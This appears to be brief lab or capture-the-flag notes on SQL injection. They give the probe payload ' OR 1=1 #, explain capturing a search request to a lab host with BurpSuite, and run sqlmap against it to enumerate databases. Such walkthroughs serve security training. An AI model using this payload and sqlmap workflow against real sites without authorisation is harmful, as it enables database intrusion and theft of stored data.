To check if a site is vulnerable to SQLi, run in a search bar:
```
' OR 1=1 #

# OR you can :

' OR 1=1 #
```

Open BurpSuite and enable proxy on your browser.
Next set Intercept = on
Do a search on the site, capture the response.
In the window below, r-click and select save to file.

e.g.: Output that you save to file:
```
POST /results.php HTTP/1.1
Host: 10.50.10.140
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://10.50.10.140
Connection: keep-alive
Referer: http://10.50.10.140/search.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

search=mary
```

Save the output to "check.txt"

# SQLmap
Bacause you know it's vulnerable to SQL injection, you can run SQLmap
```
sqlmap -r check.txt --dbs
```
